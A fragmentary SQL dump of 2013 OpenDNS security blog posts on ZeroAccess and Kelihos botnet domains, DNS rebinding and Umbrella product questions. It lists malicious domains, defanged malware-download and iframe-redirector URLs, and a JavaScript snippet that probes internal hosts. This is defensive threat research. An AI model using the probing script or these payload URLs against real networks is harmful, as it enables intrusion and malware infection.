cych.zymofevy.me, dahadkyz.ru, davujuz.com, fcegrrtc.mapuhxaf.ru, flowsre.com, hsej0rr7.insomtab.nl, huznejex.ru, nenkudyf.ru, ogfonis.org, powerwik.ru, teeply.info, widerat.com, xexumyb.com, ximirsex.ru.\nThese domains have already been blocked a while ago, and reported for suspension or sinkholing.\nThe overlap between the IP pools of the ZeroAccess and Kelihos botnets is an indication that botnets are a commodity shared among criminal campaigns to speed up the spread of infections and information stealing. More good resources on ZeroAccees can be found in [11] and [12].\nDiscovering related domains with Security Graph\nStarting from the landing domain languagespreferably.biz, and using a domain reputation algorithm applied on the SGraph DNS database, we uncover a large set of 200+ related new suspicious domains serving Blackhole Exploit kit, other Exploit kits, and other malicious campaigns (such as trojan CnC). We also cross check domain registration dates, and check DNS traffic spikes to these domains.\nThis constitutes a fast early detection system of Exploit-weaponized domains (or soon to be weaponized ones, or related new suspicious domains destined for other purposes). A lot of these EK landing domains are rather unstable on purpose. We observed that shortly after they are registered, these domains start resolving to an IP hosting an EK server, then they trigger a surge in DNS traffic for a few hours followed by a complete silence. Oftentimes, the domain stops serving the exploits or it just stops resolving. This is a clear indication that these domains are used in “hit and run” spam mail campaigns. A lot of these domains are also quickly sinkholed or suspended by registrars, hence the tendency of criminals to register these “throw-away” domains, swiftly use them, and move to a new set. We also observed examples of such domains that were registered a couple months ago and after their initial spike in activity have since gone silent. This could possibly be another trick to stay under the “radar,” evade suspension or sinkholing, and potentially come back later to be used in future malicious campaigns. In the figure below, we can see the surge in traffic for this Blackhole landing domain spotted very recently (latest urlquery report [13]).\n\nFurthermore, we can consult url databases such as VirusTotal, or urlquery to identify known active urls on these domains. With that, one can identify EK landing pages and eventually milk them for malware payloads for further analysis. These EK servers were seen to block certain IP ranges belonging to security companies or Tor proxies, therefore, other measures should be taken to circumvent these protective tricks and still be able to retrieve live payloads. This can be discussed in a future blog.\nBelow, we show a sample of some confirmed Exploit Kit or suspicious domains: associatesbreath.biz yellowgreenjackofalltrades.bizharshnesspresentations.bizlanguagespreferably.biztopmanageaccessible.bizpowerred.bizsharednonstop.bizsupermodelstomp.bizwmpslewd.bizbroadcastcontentrich.org\nAcknowledgments: Special thanks to all the great friends from MalwareMustDie (@RazorEQX and @VriesHd and more) for their valuable contribution to the discussion on ZeroAccess and discovery of the initial Blackhole landing domains.', 'Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/09/10/a-look-at-a-linkedin-spam-mail-blackhole-zeroaccess-campaign/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1627, 'Suspicious Responses: Shining a New Light on an Old Threat', 'OpenDNS Security Research', 'September 3, 2013', 'OpenDNS users may have noticed an intriguing security feature in their dashboard: the ability to block “suspicious responses.”\n\nWhen enabled, this feature blocks any DNS response containing IP addresses within a private IP range:\n10.0.0.0/8\n172.16.0.0/12\n192.168.0.0/16\n254.169.0.0/16\n254.169.0.0/16\n192.0.2.0/24\n198.51.100.0/24\n203.0.113.0/24\nAt first, that might seem a bit weird. Why would anyone want to discard legitimate responses, that are unlikely to lead to web sites worth blocking? A recently published paper has brought new attention to how these DNS responses can be exploited; let’s take this opportunity to look at what makes these responses suspicious and how we can protect against them.\nUsing external resources to scan a local network\nWhen a user visits http://example.com, his web browser is going to retrieve some HTML code located at this URL, and this HTML code can contain references to additional, external resources: images, stylesheets, fonts, or javascript code. These resources may be loaded from a totally different domain name. For\nexample, it is common practice to load static content from a CDN.\nUnless the initial page has been secured with a Content-Security-Policy header, any page can load any content from anywhere. Firefox recently blocked mixed content (loading HTTP resources from a page served over HTTPS), but that’s pretty much the only existing restriction one can come across.\nThis has been widely abused in the past: embedding fake images whose sources were visit trackers or targets of banner ads was a cheap and easy way to perpetrate click fraud. External resources, however, are much more interesting as an attack vector when combined with Javascript.\nThis simple script, for example, loads an external image (but any kind of object would do the job) at a location which is typically found in web servers running JIRA:\nvar node_img = document.createElement(\'object\');\r\nnode_img.data = \'https://192.168.100.1/images/icons/issuetypes/bug.png\';\r\nnode_img.style.visibility = \'hidden\';\r\ndocument.body.appendChild(node_img);\r\nnode_img.addEventListener(\'load\', function() {\r\n    console.log(\'JIRA has been detected\');\r\n});\nIn this case, if the presence of JIRA on this server has been detected, a debug message is printed. But this information can also be sent to a remote server.\nWhat is interesting here is the server address: 192.168.100.1. An attacker serving a web page with this script at http://attacker.example.com can force a web browser to access an internal server (192.168.100.1), load a resource that possibly requires authentication (through a previously set, non-ephemeral cookie), and communicate the result back to an attacker, without the user noticing anything. And of course, what works to detect a specific piece of software on a specific server can be extended to a full scan of the victim’s local network.\nTaking it further using XMLHttpRequest\nJavascript has the ability to issue any kind of HTTP query.\nA GET query made using XMLHttpRequest is a convenient way to retrieve any kind of content, not just to test for its presence. This can be particularly interesting if this content is an internal Wiki or an internal Git repository containing proprietary source code.\nXMLHttpRequest also gives access to other verbs: if an attacker can issue a POST, DELETE or UPDATE query, he can potentially alter internal databases, send emails on the behalf of the victim, and more.\nFor this reason, web browsers disallow cross-domain queries made that way: the host name of the initial page must match the host name of the external resource, as well as the port number and the protocol. There are mechanisms to explicitly allow cross-domain requests, but if the target is an unrelated internal server, an attacker can hardly rely on these being available.\nThis is where DNS comes into play.\nThe DNS rebinding attack\nA web site served as http://attacker.example.com/* can freely send any query to http://attacker.example.com/* and retrieve the result, but this doesn’t consider the IP addresses that attacker.example.com resolves to.\nConsider the following scenario:\nA victim is tricked into accessing http://attacker.example.com\nHis web browser sends a DNS query to turn this name into the attacker web site IP address. The A record of the DNS response a TTL of zero.\nThe victim visits the web site\nThis web site performs a XMLHttpRequest query to http://attacker.example.com\nBecause the TTL in the previous DNS response was zero, it’s not valid anymore: the browser has to resolve attacker.example.com again by sending a new DNS query\nThis time, the resolver returns 192.168.100.1 as an IP address for this name.\nBecause the protocol, port number, and name are the same as the initial page, the query for http://attacker.example.com is allowed by the web browser\nExcept that the data is sent to, or retrieved from a victim’s internal server, not the initial web site.\nThis particular attack is actually very old, and all modern web browsers defend against it by caching each name http://attacker.example.com has to resolve. If http://attacker.example.com has to be accessed more than once, the same IP address will be used every time. Failover mechanisms are also intentionally disabled: if the initial IP doesn’t accept HTTP connections any more, web browsers will not fall back to another IP until the whole page is reloaded.\nIf that’s the case, is this attack just a relic of the past?\nThe DNS rebinding attack, revived\nA few weeks ago, Yunxing Dai and Ryan Resig described a new way to conduct DNS rebinding attacks: FireDrill.\nOnce a cache is full, inserting new entries requires evicting one or more existing entries first. This holds true for DNS caches as well, including browser DNS caches.\nDai and Resig thus propose a simple yet very efficient way to force a web browser to resolve a domain name it already resolved: simply fill the browser cache by issuing other, unrelated queries.\nFilling the cache takes only a few seconds, and we verified that this technique still works on Google Chrome 30 and Firefox 23.0.1.\nTheir experiment shows how dangerous DNS rebinding attacks can be by abusing a victim’s browser as a proxy. The browser keeps a websocket connection with the attacker machine, and uses rebound domain names to post and retrieve content from internal services in the victim’s network.\nPossible defenses against DNS rebinding attacks\nHow can someone prevent this kind of attack? Targeted hosts are going to see an employee IP rather than the attacker IP, so IP-based filtering doesn’t help much. An HTTP query, however, usually includes the host name the client wants to reach.\nIf attacker.example.com is being used for a DNS rebinding attack, both the attacker’s web server and the victim’s server are going to see the same header:\nHost: attacker.example.com\nWeb servers receiving a query with an unregistered Host: header commonly serve one of the registered web sites. For example, Apache serves the first one, whereas Nginx serves the one with a listen ..default_server directive.\nOne way to prevent this attack is to configure web servers to return no content for queries sent to unregistered virtual hosts. On Nginx, doing so can be as simple as adding this snippet to the configuration file:\nserver {\r\n     listen 80 default_server;\r\n     listen [::]:80 ipv6only=on;\r\n     server_name _;\r\n     return 444;\r\n}\nSuspicious HTTP queries will be closed without any further processing. Doing so also proves to be a good way to reduce the system load when botnets are performing blind network scans to find vulnerable web servers.\nOn the other hand, changing the HTTP server configuration is rarely an option on common devices such as printers, webcams and routers.\nApplications servers also rarely check the host name in client requests, on the assumption that they won’t be directly accessed by external, untrusted users.\nNot to mention that distributed filesystems, databases and (internal) search engines also commonly expose a HTTP/JSON interface that can become the target of a DNS rebinding attack.\nBlocking DNS rebinding attacks with OpenDNS\nOpenDNS users can enable the “block suspicious responses” option in their dashboard. This blocks DNS responses containing non-routable IP addresses, and fully protects users from the threats outlined above when browser-based safeguards fall short.\nThis great feature has been available for free since April 2008, and is an efficient way to neutralize DNS rebinding attacks, provided that the internal network uses these reserved IP ranges.\nThis kind of attack may come back under the spotlight after the FireDrill paper, so we thought now would be a good time to shine a spotlight on the defense as well!', 'Security Community;Security Research', 'https://umbrella.cisco.com/blog/2013/09/03/what-are-the-suspicious-responses-and-why-you-should-block-them/');

During the incident, I spent some time helping the New York Times get their sites back to normal, and working with our friends at CloudFlare, Twitter, Google, DemandMedia, and others to get a handle on the extent of the SEA’s hacks.\nThere’s plenty of coverage of how the attack happened and what you can do to help prevent this if you’re a webmaster of a high-profile website (Hint: get a registry lock in place, not just a registrar lock), so I won’t offer yet another opinion on that front. Instead, I want to focus on what this hack means for IT professionals—the people charged with protecting employees, sensitive or confidential corporate data, and enterprises at large.\nWhen extremely popular and trusted domains like the New York Times are compromised, the real danger lies in the huge number of users affected in such a short time. The attacks of the past week seem to have amounted to high-tech vandalism, but if the SEA had perpetrated a more malicious attack, millions of computers would have fallen prey in a few hours.\nHere are three grim outlooks on what could happen when a high-profile website with a vast base of visitors is compromised:\nThe world’s largest botnet, instantly\nImagine a hacker in possession of a 0-day Adobe Flash exploit (which, let’s be honest, almost certainly exists right now) hijacks a major site like the New York Times, or worse, uses a massively-embedded piece of javascript from ShareThis and inserts the exploit. Within minutes, millions of Internet users would be compromised. Imagine creating a 20,000,000 host botnet within minutes! Moreover, the clean-up effort wouldn’t rest on the IT team at the Times or ShareThis — it would fall to the tens of thousands of IT administrators all over the world, spending hours cleaning up the mess, reviewing firewall logs, patching, etc.\nMassive watering hole attack\nIn this week’s attack, hackers didn’t compromise the actual New York Times server; they only redirected traffic headed there. But if a hacker did gain access to their server and successfully inserted malicious content onto the page, the potential for damage would be huge. In a “watering hole” attack, hackers hide malicious code within a legitimate web site, but configure it to only activate for a certain range of IPs. If a hacker knew a range IP addresses used by a particular company and had a decent guess at a web page that would be popular among that company’s employees, hundreds or thousands of employee devices could be infected before anyone outside of that IP range realized anything was wrong.\nCompromised credentials for everyone\nHacks aimed at very popular web sites can be very effective in attempts to steal credentials because they have large audiences, and we all place a lot of faith into such big brand names. The hackers behind this week’s attack could have redirected visitors to spoofed page asking for nytimes.com credentials to proceed. At such a large scale, even a barely passable fake could yield millions of usernames and passwords—and we all know that most employees remain frustratingly careless about creating unique passwords across accounts.\nFighting back: Deploying security that operates at Internet scale\nThe bad news is, your nightly anti-virus definitions aren’t going to help you here. Neither is your old-school web security appliance. When employees are in and out of the office, using Wi-Fi, cellular, and other networks, you need blanket protection that provides a secure conduit to the Internet so your employees can connect with confidence.\nHere’s the good news, there’s something you can do about it. Even though the threat landscape has changed dramatically, these complex scenarios are exactly what we’ve been building our company to address. Umbrella for Enterprise protects all of your users, across all of their devices, no matter where they’re working.  More importantly, our real-time predictive threat protection figures out when a site like the New York Times is redirected to a new, untrusted, or historically malicious source, and blocks access to it pre-emptively. Our cloud-delivered security benefits from powerful Big Data analysis of the 50 billion DNS requests that we handle each day, and it responds to threats in real-time to protect you from today’s advanced attacks—not just yesterday’s.\nIn a perfect world, malicious attacks like this week’s wouldn’t be a problem, but unfortunately they seem to be growing in frequency and advancing in sophistication. Faced with such a challenge, I’m excited to see that when the security techniques pioneered by OpenDNS were put to the test, they passed with flying colors.', 'Announcements;Security 101', 'https://umbrella.cisco.com/blog/2013/09/03/what-the-recent-sea-hacks-mean-for-it-security/');

If you’ve read the title of this post, you’ve probably guessed that I’m talking about Support!\nSupport is one of the major arteries of any company—OpenDNS is no different. Our amazing support team works around the clock to ensure that our customers are taken care of, no matter what the issue may be.\nTo get some insight into what makes our support reps tick, I sat down with one of our best Customer Support Representatives, Ashley Williams:\nKD: So, why support? It’s not the easiest department to work in.\nAW: I enjoy talking to people and fixing things—letting people know they can be at ease with our products and our company in general. When people email us in a panic, we help them understand that it’s not that bad, that we’ll get through this.\nOur DNS service is very powerful. It’s a core Internet protocol, and sometimes that can be intimidating to users. Coming in, I had a basic understanding of DNS, but the more you learn about it, the more fascinating it becomes. We want to help people recognize that, and utilize the services we provide to the fullest extent.\nBeing in support has also allowed me to hone some new skills: I’m definitely more efficient now! But I’ve also learned the best ways to word answers, and how to quickly understand my audience—to ascertain their level of technical skill and give them the appropriate response.\nKD: Is there anything you wished more people would ask?\nAW: I wish more people would ask about our processes: how we protect them against malware, botnets, and phishing attacks. I also wish people would understand that they need to be cognizant of network security in general: basic password security, keeping your kids out of your network, etc.\nKD: Do you have any tips for new users?\nAW: Take advantage of the Stats tool! People usually don’t enable this by default, but it’s a great tool for troubleshooting. You can also use it to search domains that need to be blocked/unblocked; it’s a lot of information that people don’t utilize. Even if you’re a beginner, you can (and should) use it to see what’s going on in your network.\nKD: What about from a support perspective? What can people do to improve the experience?\nAW: The best tip I have for people contacting support is to be as detailed as possible when submitting tickets and to follow support directions very carefully. It’s easy to be frustrated when something isn’t working, but if we say we need a screenshot, we really do need one. The faster we can diagnose the problem, the faster we can fix it for you!\nKD: Can you tell me a little more about the Support Team, and how they operate within the company?\nAW: We have an amazing team, populated with people from very different backgrounds. We’ve got security professionals, Linux admins, CS majors, etc.—very technical people who know our products inside and out in order to help customers as much as possible. At OpenDNS, we’re committed to helping each customer until their issue is completely resolved; we’ll never abandon you in the middle of fixing a problem.\nAnother great thing about Support is that we have a very unique position here: we basically have a finger on the pulse of the company, working at the intersection of all other departments. The way our company is set up, we can easily contact someone in Engineering, Ops, Sales, or anywhere else if we need clarification on an issue.\nKD: What do you want customers to know about OpenDNS Support?\nAW: We care! We really do. From free users, to Mobility customers, to Enterprises, even to people who don’t have accounts with us – we care about you and we want to solve your issue as quickly as possible. We know you’re frustrated, and we want to help you fix it. When you email us, rest assured there is an actual person on the other end of the line reading that email, and I’m doing everything in my power to get you back on track.\nOpenDNS is growing, and so is the need for amazing Support Reps!

For many organizations, that coverage has come at the expense of slow connections, limited mobility, or productivity. Last week, Product Manager Scott Cressman hosted a webcast demonstrating how IT departments can use Umbrella to provide effective security—without the tradeoffs. If you missed the live broadcast, you can view the recording, and see answers to the most popular questions below.\n\n1. How can I ensure that a user can’t get around the policies I configure in Umbrella?\nBecause Umbrella applies security to DNS requests, policies are enforced regardless of the application, port, or protocol making a connection. To make sure users can’t resolve domains using an alternative DNS service, block all traffic from port 53 except for traffic directed at our DNS servers.\n2. Does it interfere with desktop antivirus software?\nUmbrella protects your users by preventing malware and other threats from entering the network through the Internet. Our technology is designed to prevent and contain threats before they reach endpoint devices, but Umbrella is fully compatible with layered security deployments and will work with any vendor’s desktop antivirus software.\n3. How much does Umbrella slow down the connections?\nUnlike a physical security appliance which introduces a bottleneck through which all network traffic must pass, or VPNs which backhaul all traffic to the corporate network, Umbrella security adds zero latency to your network. Our cloud-delivered security is built on a core Internet protocol and applies policies directly to every DNS request originating from a protected network or device.\n4. How do we protect mobile users working with notebooks, tablets, and mobile devices?\nUmbrella can provide security to endpoint devices even when they are taken outside of your organization’s network. With Umbrella Roaming, a lightweight agent on each device directs all Internet traffic to use our DNS servers, so your policies are enforced anytime, anywhere. With Umbrella Mobility, a VPN profile can be applied to protect your iOS devices in the same way.\n5. Do you have a trial version?\nYes, we do offer comprehensive free trials. As a cloud-based service, there is no hardware to install or software to download. Umbrella is simple enough to deploy in just a few minutes.', 'Umbrella;Webcasts', 'https://umbrella.cisco.com/blog/2013/08/23/your-questions-answered-security-without-sacrifices/');

Your computer could be working long into the night, sending out spam emails by the thousands or even participating in a DDOS attack. In this post, we’ll take a look at the landscape of online bots, and see what parts of the world are home to the most infected machines.\nYou’ve probably seen this rotating globe on the Labs website. It graphs the real-time botnet requests coming from and going into different countries around the world. (Head to http://labs.umbrella.com/global-network/ to see it spin!) 50 million people worldwide use our DNS service, and we handle 50 billion DNS requests per day.

Usually, this data is kept and archived for a defined period of time. As we store more and more information, our desire to understand its behavior grows. The reason is simple: knowledge is powerful. So, if we identify a pattern in our past, we master the present – then we can predict the future.\nToday’s data scientists are the modern oracles, always trying to discover ingenious ways to analyze information in order to identify new patterns and anomalies. Just like the first astronomers raised their eyes to the sky and clouds to predict the seasons, we are constantly analyzing a deluge of digital messages to monitor the general state of the system. It is crucial to step back and take a look at the big picture and understand that abstraction is the key to mastering the present.\nVisualize the universe\nWhen it comes to patterns, semantic graphs are one of the most beautiful data structures out there. They can represent anything and can be applied to a wide range of problems, from social networks to artificial brains. Graph nodes can define any type of information and edges can model arbitrary connections between them.\nSure, it sounds simple in theory, but in practice we are dealing with billions and billions of nodes and edges! When it comes to visualization, there is a tremendous challenge in building an engine that can handle the vast amount of data that the universe holds. Even more importantly, the graph has to be dynamic and constantly changing over time. The goal is to build a robust and stable tool to establish, try, and confirm our hypotheses.\nHow does it work? The engine recreates a physical force system where connected nodes attract each other and disconnected nodes repulse each other. At first, all the nodes are placed at approximately the same position, forming a point of high density. Of course, at this stage it’s still impossible to see anything clearly. But then, we heat the node particles at a high temperature and let the physics engine do the rest!\nTemperature creates a random particle movement and the messy network structure expands in space at high speed, throwing nodes in every direction.\n\nThat’s right, an explosion of data!\nAfter this stage, the structure progressively reaches equilibrium. This is the true beauty of this method: we artificially reimplemented a natural force directed system and therefore natural structures emerge. We cool down the temperature progressively and as the particle acceleration decreases, the network structure crystallizes.\nDemonstration\nSince a picture is worth a thousand words, we’re sharing with you a WebGL application and a couple of screenshots of our visualization tool to illustrate this algorithm.\nYou may note that the process has been intentionally slowed down to make the attraction-repulsion forces more obvious.\nControls:\nClick play to start animation\nNavigate with the mouse and keyboard arrows\nDouble click on a node to zoom in and target a node\nClick anywhere to go back to FPS view\nSelect various display modes in the menu\nNOTE: The engine may take a while to load, please be patient.\nhttp://thibaultreuille.github.io/OpenDNS/raindance-2013-08-09-blog/\nUmbrella Security Graph Data Sets\nUsing this visualization method, we can process the massive amounts of data flowing into to the Umbrella Security Graph at any given time – watching for new malicious patterns or any other unusual activity.

Security intelligence requires massive amounts of data in order to accurately predict the origins of convoluted threats; enforcement policies must be able to dive deep to protect every port, protocol, and app.\nTraditional appliances can’t find that balance – if they need to adjust, laborious hardware overhauls and administrative headaches are bound to occur.

Prevent threats that are specifically designed to infect your mobile devices, such as phones, tablets, phone tablets, camera phones, smart phones, cellular phones, rotary phones, etc. You want to protect your roaming clients. We want to help you protect your roaming clients.\nThe Drive-By Download/Exploits category is to prevent against a malicious download that happens without the person’s knowledge, or better yet a download that you authorize without understanding the consequences it may have on your computer or network (i.e. Surprise!  That wasn’t actually a song you downloaded, it was a virus).  Nobody likes malware on their computer, let alone surprise malware on their computer. We’ve created this category to keep you and everyone else, from coworkers to loved ones, safe from downloading unwanted surprises.\nThe High Risk Sites and Locations category is used to predictively protect against malicious domains.

By observing how exploits utilize core Internet protocols, we have engineered a solution that does the same thing, allowing us to stop reacting to infections and start preventing them.\nThat solution is Umbrella by OpenDNS. A secure cloud gateway that revolutionizes the way security is delivered, Umbrella can identify and block malicious activity before it becomes a threat – and help to contain the damage that’s already been done.\nIn a well-established industry like security, a disruption of this magnitude is bound to elicit questions – more than we had time for during the broadcast. Below, we’ve collected and answered your top five questions from the webcast:\nDoes Umbrella replace OpenDNS? How is it implemented on my network?\nUmbrella takes everything you love about OpenDNS (faster and more reliable browsing, phishing protection, and unbeatable support) and adds predictive threat protection powered by our game-changing Security Graph – resulting in a cloud-delivered security solution that combines security intelligence and enforcement for maximum protection.\nImplementation is quick and painless – because Umbrella is cloud-based, simply change your IP settings to the OpenDNS resolvers. From there, Umbrella will apply your policies to all requests on the network.\nCan Umbrella protect devices once they leave my network? For example, an employee working from a coffee shop.\nAbsolutely – Umbrella is designed to protect all your endpoints, on- and off-network. To protect roaming laptops, simply provision the lightweight Umbrella agent on the device. This agent will forward all DNS traffic to Umbrella resolvers while enforcing your network policy. Similarly, to secure iPhones and iPads, users simply download and install the Umbrella VPN app or profile – all it takes is a few clicks.\nHow quickly does Umbrella recognize and block malicious sites?\nWe recently upgraded our Umbrella services to work with the Security Graph, which allows for enhanced predictive threat protection. Leveraging the power of big data, we can accurately predict where malicious activity will emerge, and block that site before users can access it. While there is no set timeframe for this process, the Security Graph uses machine-learning and algorithms to ensure that you stay one step ahead of bad actors.\nHow does Umbrella handle multiple locations? Can I set rules for and manage multiple locations in one management console?\nUmbrella allows you to manage multiple locations easily by defining your locations and configuring site-specific policies. With our lightweight Virtual Appliance you can also configure policies and view reporting data for specific Active Directory users, groups, or segments of your networks.\nUmbrellas cloud-based web management console enables you to manage your entire distributed network, devices, users and group settings from any location.\nOnce Umbrella is installed on my network, is there any active management my IT team needs to do or is it self-managed once traffic is switched to OpenDNS resolvers?\nUmbrella is designed to reduce administrative overhead, and it’s user-friendly dashboard does just that. Once you’ve established your network settings and provisioned your devices, we’ll take care of the rest. In addition, our new security categories allow for easier prioritization of security incidents – and real-time reporting allows context for events such as botnet, malware, or phishing requests, including other suspicious or high-risk site requests.\nWe’re changing the way we think about security – and proving that efficacy and manageability don’t have to compromise performance. With security intelligence and enforcement working together in harmony, Umbrella provides a unique solution that seamlessly guards every endpoint – anywhere, anytime.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1638, 'Seamless Campus-Wide Protection Without Latency: Fighting Back Against University Cyber Attacks', 'Kara Drapala', 'August 5, 2013', 'Cyber attacks on universities and colleges have been increasing at an alarming rate – and it’s not difficult to see why. Higher education institutions have long been known as repositories for valuable data, such as advanced research in fields like health, technology, and science, not to mention the personal information of faculty, staff, and students. University IT staffs, already stretched thin by increasing workloads, are hard-pressed to keep up with every piece of malicious code and phishing attempt, or even to make sure that software is properly updated and patched.\nBut there is hope: although attackers have advanced technology and techniques at their disposal, security has evolved too. Protecting a University network doesn’t require a PhD, just a thorough understanding of the problem, and how recent advances in security can fill holes traditional solutions fail to address.\nSecuring University networks is a unique challenge due to the openness and flexibility demanded by academia. Students, staff, and faculty are likely working with collaborators from all over the planet – a restrictive security policy infringes on the learning experience. Aside from digital knowledge sharing, members of your university community are traveling the world, connecting to and downloading from unsavory and unsafe networks – and bringing those possibly infected devices back home to the university network.\nThese issues add up to one impossible equation – how do you proactively protect devices within your network from advanced cyber attacks when you barely have time to remediate existing issues? Anti-virus alone isn’t enough, and traditional proxy-based appliances can’t handle the bandwidth modern universities demand, nor do they scale at the rate you need. The answer is simple, and possibly right overhead: the cloud.\nCloud-delivered security is ideal for higher education, as it meets the specific needs of an academic institution, without feeling like “big brother”. With a cloud-delivered security strategy, you can protect your networks without bulky boxes that eat up more person-hours than malware. Lightweight solutions, like Umbrella, can significantly reduce administrative overhead – meaning that you’ll have more time to inspect what’s really going on in your system, and prevent malware, botnets, and phishing attempts from running rampant. It’s also incredibly easy to scale with the cloud – provisioning new devices takes a few minutes, and you’ll never need sizing guides or endless refresh cycles or hardware upgrades.\nOther industry advances, such as big data analysis and implementation, are ensuring that cloud-delivered security is as effective, if not more so, than traditional methods which focus on detection and prevention. Security should be proactive, not reactive – by the time you react, it’s already too late. With cloud-based security, the focus switches from detect-and-prevent to prevent-and-contain – keeping bad actors out, and preventing compromised devices from sending data to botnet command and control servers. Umbrella, which operates on the network layer, can prevent malicious behavior by blocking dangerous traffic to and from your endpoint devices, whether they’re on- or off-network.\nWhatever your current solution may be, exploring the benefits of switching to a secure cloud gateway should be a priority for any higher ed IT team – because you should be able to enjoy security without sacrifices.', 'Security 101;Umbrella', 'https://umbrella.cisco.com/blog/2013/08/05/cybersecurity-for-higher-ed/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1639, 'Tracking Versatile Kelihos Domains', 'Dhia Mahjoub', 'July 30, 2013', 'Previously, we discussed how we regularly monitor our DNS traffic for malicious fast flux domains [1][2]. One notable family of fast flux domains that we see every day are the “Kelihos” domains: A steady stream of DGA-like .ru domains (occasionally .com or .us), freshly registered, resolving to a single IP with a TTL of zero, and whose name servers are also fluxing with a TTL of zero. These domains have been covered numerous times recently [3][4] and been the subject of multiple takedowns [5], but despite this publicity and efforts, their malicious usage has not abated.\nWe observe that these domains are used for at least three purposes: as redirectors for Blackhole and Red kit exploit kits, as malware dropping domains for diverse trojan specimens (mainly the Kelihos trojan), and as CnC, appearing in the network traffic of trojan samples already installed on infected machines.\nIn this blog post, we’ll take a look at a few such domains from our perspective, show how they serve multiple purposes, and describe a few live cases of their malicious usage. Notice that all domains mentioned in bold in the tables are live at the time of this writing.\nDomains’ activity in trojans’ traffic:\nIn the table below, we show a sample of recent .ru domains that were reported in the network communications of known trojans [6][7]. We detect these domains in our DNS traffic either a few days before or on the same day that a related malware analysis report is published. Notice, the last two domains registered on July 11th stayed dormant for about 10 days, then started being DNS-active and were reported in samples’ reports. As of this moment, they are no longer resolving.\n\nDomains’ usage as trojan downloaders:\nWe now show a sample of domains used as Kelihos payload downloaders via exploit kit infections. At the time of this writing, these domains are live, as are the payload URLs.\n\nDomains’ usage in Iframe injections:\nIn the following table, we inspect another sample of “Kelihos” domains. These domains are used as Exploit redirectors in hidden iframe injection attacks against the listed web pages. At the time of this writing, many of these web pages are still compromised (several may have been cleaned or no longer resolve, or their Exploit landing domains may have stopped resolving). This list is just a small set for illustration purposes as we counted tens of such infected “innocent” sites still live (a number expected to reach the hundreds), with more systematically infected every day. The last domain of the table has been suspended, but we are showing it as we will discuss it in a following example.\n\nCommonly, multiple pages of a website are infected simultaneously – and some webpages have the same iframe injection block replicated several times across the page (likely to maximize the chance that the malicious javascript is executed when the page loads). These blocks point to one specific exploit landing domain, although they could also point to several different domains. Moreover, on the same compromised page, the redirection url changes from one visit to another.\nLet’s take the example of hxxp://cimplerd.com/essie/. On this page’s source code, we observe some legitimate javascript loading code at the top, followed by a large number of white spaces that the attacker most likely injected as a “simplistic” obfuscation ploy – so that if a human tries to hastily inspect the source code, the malicious code following the white spaces does not show in the screen window.\nFollowing the white spaces, there are two iframe injection blocks that redirect to hxxp://abmisgaz.ru/count2.php and hxxp://ycsycxyd.ru/count29.php. These iframe injection blocks also feature the CookieBomb attack that we will discuss in the next section. The second block injection attempt failed though, as it appears truncated in the webpage screenshot. Notice also how the injected javascript blocks are not obfuscated.\n\n\nCookie bomb/iframe injection attack example:\nBy checking the compromised pages, we observed that most of the iframe injection attacks are actually “CookieBomb” javascript attacks. The “CookieBomb” attack is a recent twist on the hidden iframe injection, where the ensuing redirection or infection is made conditional upon the possession of a cookie. MalwareMustDie first described it in a fantastic article, also providing a PoC [8][9].\nBriefly, the idea is that if you enabled cookies in your browser and you visit a compromised site, the injected javascript will check if you hold a certain cookie – and will create one for you if you don’t. Subsequently, the .php code on the landing page will check for the cookie,  and depending on what the attacker set the php up to do, it could further redirect you to another site, or drop the malware right onto your machine, etc. In the image below, we can see an example of a CookieBomb code block:\n\nWe also observed that some webpages were infected multiple times with this attack; for example, hxxp://www.scouts108.org.mx/index.php had 9 injected exploit redirection/CookieBomb code blocks (with 9 redirection URLs) scattered across the page. These blocks pointed to 3 distinct exploit redirection URLs overall. The URLs at the time of analysis were:\nhxxp://ycsycxyd.ru/count29.php\nhxxp://ycsycxyd.ru/count29.php\nhxxp://jibnikek.ru/count29.php\nhxxp://zofbeqve.ru/count2.php\nhxxp://jibnikek.ru/count29.php\nhxxp://ycsycxyd.ru/count29.php\nhxxp://ycsycxyd.ru/count29.php\nhxxp://ycsycxyd.ru/count29.php\nhxxp://jibnikek.ru/count29.php\nThis could likely be the result of an automated script maliciously loaded on the hosting server that attempts to infect, in bulk, as many websites (and webpages) as possible that are hosted on the same server. However, this mass infection of web pages can be counterproductive for the bad guys (and good for us) as the injected javascript often fails to properly load and does not lead to the final drive-by malware download.\nWe also noticed that compromised websites are multi-national, observing websites from Mexico, Peru, Russia, Poland, Turkey, India, and Thailand, etc. This could indicate that the bad guys target their “iframe injection” infections against sites in bulk, regardless of their origin, where these sites could have vulnerabilities in their web server setup, or whose administrative FTP credentials were leaked or purchased, etc. The end goal here is to infect as many user machines as possible and harvest the most accounts and personal data. Obviously, the attacks could also be targeted against a specific population or a business group.\nDual purpose domains:\nWe also observed that a lot of “Kelihos” domains are recycled for multiple uses: exploit redirectors and trojan droppers among them. Let’s take the example of powerwik.ru. At the time of this writing, this domain has been used as exploit redirector: hxxp://powerwik.ru/count3.php injected for example in this site http://www.bth-avocats.com/, and as a kelihos payload downloader with the following URLs: hxxp://powerwik.ru/userid2.exe, and hxxp://powerwik.ru/rasta01.exe. Below are the virustotal analysis reports of these two payloads:\nhttps://www.virustotal.com/en/file/db6d4312cd17fe158002329eda2e1e76a8cf13a39857e29caa5052b8f5d93e14/analysis/1375057453/\nhttps://www.virustotal.com/en/file/411e66f30c64b35a2862b65e9c72a5f6757fcd014d2a6fa1a57ef4cc733e92f4/analysis/1375057548/\nThe geography of the infections:\nWe will now discuss an interesting observation related to the geography of the client IPs querying Kelihos domains as we see it from our DNS traffic. Let’s take the example of afau.gajkukuc.ru: this domain shows a surge in DNS traffic between 10pm and 12am UTC on the night of July 24th.\nWe checked the client IPs that looked up this domain, and display their country distribution in the map below. Notice the high concentration of clients in Turkey (next are the US, Canada and Mexico). We speculate that either users in Turkey were targeted by a spam campaign leading to afau.gajkukuc.ru (as an Exploit redirector or payload downloader), or that several Turkish speaking websites were compromised with iframe injections also leading to afau.gajkukuc.ru.\n\n\n\nWe observe this behavior with other domains, for example: ca595.ximxamli.ru. This domain shows a spike of DNS queries between 6 and 8am UTC on July 24th from client IPs highly concentrated in Vietnam and 